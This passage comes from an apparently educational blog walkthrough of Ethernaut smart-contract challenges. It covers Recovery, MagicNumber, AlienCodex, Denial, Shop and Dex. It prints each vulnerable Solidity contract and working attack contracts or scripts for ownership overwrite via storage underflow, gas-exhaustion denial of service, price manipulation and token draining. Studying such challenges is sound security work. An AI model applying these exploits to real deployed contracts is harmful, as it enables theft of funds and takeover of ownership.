&#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The etherscan tutorial, use the instance address to check the address to which the transfer was made. Convert it to a contract and call the destroy function.</p>
<p>Or manually calculate the simpleToken contract address.</p>
<p>First, the nonce of the first new contract initiated by an external account is 1.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const RECOVERY = &quot;&lt;你的 Recovery instance地址&gt;&quot;;</span><br><span class="line">await _ethers.utils.getContractAddress(&#123; from: RECOVERY, nonce: 1 &#125;);</span><br></pre></td></tr></table></figure>

<h3 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line">    address public solver;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setSolver(address _solver) public &#123;</span><br><span class="line">        solver = _solver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here you need to write a contract that returns 42 using less than 10 commands. Here you can use EVM Bytecode to write it manually.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">60 2a // PUSH1 0x2a; Push constant 42</span><br><span class="line">60 00 // PUSH1 0x00; Target memory location (slot 0)</span><br><span class="line">52 // MSTORE; [0..32) writes 32 bytes, placing 42 in the low order</span><br><span class="line">60 20 // PUSH1 0x20; Returns length 32</span><br><span class="line">60 00 // PUSH1 0x00; Returns starting memory location 0</span><br><span class="line">f3 // RETURN; Returns [0, 32); Valid for any function selector</span><br><span class="line"></span><br><span class="line">60 0a // PUSH1 0x0a; Runtime length 10 bytes</span><br><span class="line">60 0c // PUSH1 0x0c; Runtime offset in this code (immediately following the creation section)</span><br><span class="line">60 00 // PUSH1 0x00; Copy to memory start position 0</span><br><span class="line">39 // CODECOPY; mem[0..10) = code[0x0c .. 0x0c+0x0a)</span><br><span class="line">60 00 // PUSH1 0x00; RETURN start</span><br><span class="line">f3 // RETURN; Return the 10 bytes just copied =&gt; becomes the &quot;contract code&quot; after deployment</span><br></pre></td></tr></table></figure>

<h3 id="AlienCodeX"><a href="#AlienCodeX" class="headerlink" title="AlienCodeX"></a>AlienCodeX</h3><p>There are a few points to understand here.</p>
<ol>
<li>Solidity’s storage is a ring modulo 2^256.</li>
<li>Dynamic arrays such as uint256[], bytes32[]; bytes, string; Mapping; Struct; and uint256[3], all types of data do not directly store the content and length&#x2F;index in the same slot; they are all stored separately.</li>
<li>Taking an array as an example, based on the slot where the array length is located, call keccak256(abi.encode(uint256(slot))) to calculate the address of the first element of the array, and then add <code>i</code> to traverse the array.</li>
</ol>
<p>The contract code is as follows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As can be seen above, the array’s slot is 1, while Solidity’s storage size is 2^256. type(uint256).max &#x3D; 2^256 - 1. Therefore, to trigger integer underflow and set the owner stored in slot 0 to our EOA address, i must satisfy i + array.base(calculated by keecak256) &#x3D;&#x3D; type(uint256).max + 1.</p>
<p>Here, the 1-byte bool and the 20-byte address(owner) are packed into one slot (slot0), so the slot storing our array length is 1.</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.30;</span><br><span class="line"></span><br><span class="line">interface IAlienCodex &#123;</span><br><span class="line">    function makeContact() external;</span><br><span class="line">    function retract() external;</span><br><span class="line">    function revise(uint256 i, bytes32 content) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    IAlienCodex public target;</span><br><span class="line">    </span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        target = IAlienCodex(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        target.makeContact();</span><br><span class="line">        target.retract();</span><br><span class="line">        uint256 base = uint256(keccak256(abi.encode(uint256(1))));</span><br><span class="line">        uint256 i = type(uint256).max - base + 1;</span><br><span class="line">        bytes32 content = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        target.revise(i, content);//address 20 bytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);//There is no specified amount of gas to be consumed here, so almost all the gas will be released at once, leaving (1/64)</span><br><span class="line">        payable(owner).transfer(amountToSend);// Here the transfer function consumes a fixed amount of 2300 gas</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The main issue here is gas. In partner.call{} , the gas consumption is not specified, so the entire 63&#x2F;64 gas allocation is sent out at once. If an attacker consumes this amount in the attacking contract, subsequent operations will be difficult to complete.</p>
<p>To prevent partner setup failure, we need to call the setup function and withdraw separately, then set up fallback and receive functions. Using an infinite loop, we can continuously consume gas, consuming the 63&#x2F;64 gas allocated, preventing the attacker from completing the subsequent transfer operation (fixed gas consumption of 2300).</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IDenial &#123;</span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IDenial public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = IDenial(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomePartner() external &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pokeWithdraw() external &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123; burnGas(); &#125;</span><br><span class="line">    receive() external payable &#123; burnGas(); &#125;</span><br><span class="line"></span><br><span class="line">    function burnGas() internal pure &#123;</span><br><span class="line">        while (true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IBuyer &#123;</span><br><span class="line">  function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint256 public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    IBuyer _buyer = IBuyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The fundamental problem here is that the price function is called twice, modifying a critical state variable—isSold—in between calls.</p>
<p>So, we can exploit the difference in the value of this state variable in the attack contract to achieve different return values for the two function calls, thereby completing an attack and completing a purchase at a lower price than the target price.</p>
<p>The attack contract is as follows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IBuyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is IBuyer &#123;</span><br><span class="line">    function attack(address shop) external &#123;</span><br><span class="line">        IShop(shop).buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view override returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h3><img src="/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.06.png" class="" title="截屏2025-09-14 16.46.06.png">

<img src="/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.23.png" class="" title="截屏2025-09-14 16.46.23.png">

<p>The two Fig. above illustrate UniSwap V2’s pricing calculation process (the EVM cannot represent decimals, so multiply by 1000).</p>
<p>Let’s look at the pricing calculation formula provided by this contract.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As you can see, the calculation is based on a percentage, with no tax rate or validation.</p>
<p>Typically, the pricing formula is as shown in the diagram above, or a require is used for validation later.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 伪码</span><br><span class="line">amountInWithFee = amountIn * 997;</span><br><span class="line">amountOut = amountInWithFee * R_out / (R_in*1000 + amountInWithFee);</span><br><span class="line">// 或： (balanceIn*1000 - in*3) * (balanceOut*1000) &gt;= reserveIn*reserveOut*1000^2</span><br></pre></td></tr></table></figure>

<p>所以这里攻击步骤是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let token1 = await contract.token1();// getter function</span><br><span class="line">let token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">await contract.approve(instance, 1000);</span><br><span class="line"></span><br><span class="line">await contract.swap(token1, token2, 10);// this is all calculated by formula</span><br><span class="line">await contract.swap(token2, token1, 20);// </span><br><span class="line">await contract.swap(token1, token2, 24);</span><br><span class="line">await contract.swap(token2, token1, 30);</span><br><span class="line">await contract.swap(token1, token2, 41);</span><br><span class="line"></span><br><span class="line">// swap with 45 token2 because 65 * 110 / 45 = 158 &gt; 110 and 46 * 110 / 45 = 110</span><br><span class="line">await contract.swap(token2, token1, 45);</span><br><span class="line"></span><br><span class="line">// should return 0</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br></pre></td></tr></table></figure>

<h3 id="Dex2"><a href="#Dex2" class="headerlink" title="Dex2"></a>Dex2</h3><p>Compared to the previous level, the check for the from and to addresses in the swap function has been removed. That is, the contract can now exchange tokens with any contract, and the pricing formula is still linear, so you can use your own minted third-party tokens to extract token1 and token2.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add_liquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The attack contract is written as follows</p>
<p>Here is a self-developed minting process.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td 